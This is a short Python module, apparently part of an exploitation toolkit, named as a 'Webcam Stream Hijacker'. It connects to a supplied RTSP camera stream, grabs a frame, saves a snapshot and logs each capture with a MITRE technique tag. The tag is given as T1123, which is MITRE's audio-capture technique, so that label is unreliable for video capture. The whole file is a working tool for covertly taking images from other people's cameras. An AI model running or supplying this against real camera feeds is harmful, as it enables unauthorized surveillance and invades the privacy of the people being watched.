# modules/exploits/webcam_stream_hijacker.py

import cv2
import argparse
import os
import json
from datetime import datetime

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1123"  # Audio Capture / Video Capture

def log_capture(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def hijack_stream(rtsp_url, snapshot=False, output_path="results/stream_capture.jpg"):
    print(f"[+] Connecting to RTSP stream: {rtsp_url}")
    cap = cv2.VideoCapture(rtsp_url)

    if not cap.isOpened():
        print("[!] Failed to open stream")
        return

    ret, frame = cap.read()
    if not ret:
        print("[!] Failed to grab frame")
        cap.release()
        return

    os.makedirs("results", exist_ok=True)
    if snapshot:
        cv2.imwrite(output_path, frame)
        print(f"[âœ“] Snapshot saved to: {output_path}")

    cap.release()

    log_capture({
        "timestamp": datetime.utcnow().isoformat(),
        "stream": rtsp_url,
        "snapshot_saved": snapshot,
        "output": output_path,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Webcam Stream Hijacker")
    parser.add_argument("--rtsp", required=True, help="RTSP stream URL")
    parser.add_argument("--snapshot", action="store_true", help="Save one frame as image")
    parser.add_argument("--out", default="results/stream_capture.jpg", help="Snapshot output path")
    args = parser.parse_args()

    hijack_stream(args.rtsp, snapshot=args.snapshot, output_path=args.out)
